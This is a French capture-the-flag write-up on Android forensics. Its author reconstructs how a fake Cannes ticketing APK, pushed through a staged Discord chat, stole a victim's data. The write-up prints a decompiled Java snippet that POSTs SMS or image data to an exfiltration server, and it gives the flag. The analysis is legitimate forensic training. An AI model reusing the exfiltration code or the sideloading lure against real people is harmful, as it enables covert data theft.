SpyDroid
=============

On va utiliser ALEAPP (https://github.com/abrignoni/ALEAPP) et regarder les informations a notre disposition : 

On trouve d'abord l'email de la victime : lauracinema958@gmail.com,

Historique de conversation Discord : 

pierrebzh_92574 : 
Bon… je commence à perdre patience. Trois jours que j’essaie de réserver des billets à l’ouverture, et trois jours que le site plante. Ce matin j’ai même pas vu la file d’attente, juste un "erreur 503".

laura_cinema : 
Même chose. J’étais prête à 8h55 avec mon café, tout bien calé… Résultat : chargement infini, puis plus rien. J’ai actualisé 15 fois, et puis j’ai abandonné.

ludotech_ : 
On dirait que rien n’a changé depuis l’année dernière. Leur plateforme est toujours aussi fragile. C’est incompréhensible qu’un évènement comme Cannes ait un système aussi peu fiable

pierrebzh_92574 : 
Et le pire, c’est qu’on sait d’avance que ce sera pareil l’an prochain. Ils doivent se dire que les gens viendront quand même, alors pourquoi se fatiguer…

laura_cinema : 
En attendant, nous on peut pas réserver un seul film. C’est épuisant. Tu prépares ton programme pendant des semaines pour rien.

ludotech_ : 
Bon. J’vous lis galérer depuis ce matin et j’me dis que c’est peut-être le moment de partager un truc que j’ai trouvé. C’est pas officiel, donc à prendre avec des pincettes. Mais j’ai testé, et pour moi ça marche.

pierrebzh_92574 : 
h, voilà… le moment où Ludo sort sa botte secrète. J’espère que c’est pas encore un fichier zip trouvé sur un chan Telegram douteux.

ludotech_ : 
Haha non, rien d’illégal, t’inquiète. C’est une appli Android — une APK, donc — qu’un gars a développée et partagée sur un forum. Le mec est français apparemment. Il a codé un truc pour centraliser les séances du Festival. Et il y a même une option de "réservation directe" dessus.

laura_cinema : 
Tu veux dire qu’on peut réserver via cette appli ? Parce que si c’est vrai, je la prends direct. Le site officiel me rend folle.

ludotech_ : 
C’est ce que j’ai compris ouais. Moi je suis pas à Cannes donc j’ai pas pu tester la résa, mais tout le reste est fonctionnel. Tu peux filtrer par jour, voir les films, les horaires, les lieux, tout ça. L’interface est propre, sombre, sans pubs, et ça rame pas.

pierrebzh_92574 : 
Tu l’as trouvée où exactement ton appli ? Et pourquoi elle est pas sur le Play Store si elle est si bien que ça ?

ludotech_ : 
L’auteur disait qu’il voulait pas la publier publiquement pour éviter que trop de monde s’en serve. Il l’a balancée sur un forum fermé, et c’est un autre membre qui a partagé le lien. Je l’ai téléchargée, installée, et franchement… rien à signaler

laura_cinema : 
lle demande quoi comme autorisations ? Parce que j’ai pas envie de finir avec un spyware.

ludotech_ : 
Juste les photos + SMS. Rien d’extraordinaire pour une appli de ce type. Pas d’inscription, pas de compte à créer, pas de redirection suspecte.

pierrebzh_92574 : 
Bon moi j’passe. Rien que "APK sur un forum", ça me refroidit. J’ai pas envie de voir ma galerie de photos sur Twitter.

laura_cinema : 
Bah écoute… Franchement je suis à bout. J’en ai marre de tourner en rond avec le site officiel. Si y’a une chance que je puisse réserver autrement, je tente. C’est pas comme si j’avais mille solutions de toute façon.

ludotech_ : 
Ok, je t’envoie l'appli : Nom du fichier : **CannesBilletterie.apk** Tu me diras ce que t’en penses.

laura_cinema : 
Je télécharge…
Téléchargement terminé. Je lance l’installation. Bon… faut activer "sources inconnues", je sais, c’est pas l’idéal, mais tant pis.

pierrebzh_92574 : 
Tu fais comme tu veux hein… mais garde-nous au courant si l’appli te demande soudain ton code bancaire 😅

laura_cinema : 
C’est bon, installée. J’ouvre l’appli.

Bon on a déja pas mal d'info sur ce qu'il s'est passé.


On trouve aussi cet email : 
Bonjour Laura,

Nous avons le plaisir de vous annoncer le lancement d’un nouveau concours qui mettra vos talents d’analyse et vos compétences techniques à l’épreuve !

🎯 Objectif :
Identifier et reconstruire un code cadeau caché à partir d'une situation simulée de compromission. Le premier à soumettre le bon format remportera une récompense exclusive !

🧩 Format du code :
Le code cadeau est à reconstituer sous le format suivant :

SHUTLOCK{nom_appli/pseudo_de_l'attaquant/jour_infection/IP_Destination}

Exemple :
SHUTLOCK{com.example.webmail/rootkit42/12-04-2025/192.168.1.15}

Envoyé avec la messagerie sécurisée Proton Mail.

On a priori un format flag ? SHUTLOCK{nom_appli/pseudo_de_l'attaquant/jour_infection/IP_Destination}

On a déjà le nom de l'application, que l'on retrouve dans data/data/fr.shutlock.billetterievipcannes 

Le pseudo de l'attaquant **ludotech_**

La date avec le jour des messages : **15-04-2025**

Il ne manque que l'IP.

On envoie l'apk sur mobsf.live, on attend l'analyse

Et on regarde la liste de connexions, ou bien directement dans le code de l'app : 

.. code-block:: console

            public Void doInBackground(String... params) {
            String imagePath = params[0];
            try {
                URL url = new URL("http://10.0.2.2:17878/");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/octet-stream");
                OutputStream os = connection.getOutputStream();
                byte[] buffer = imagePath.getBytes();
                os.write(buffer);
                os.flush();
                os.close();
                Log.w("TAG", "SMS sent to server: " + imagePath);
                return null;
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        }
    }

On retrouve alors notre IP : **10.0.2.2** 

On a donc notre flag : **SHLK{fr.shutlock.billetterievipcannes/ludotech_/15-04-2025/10.0.2.2}**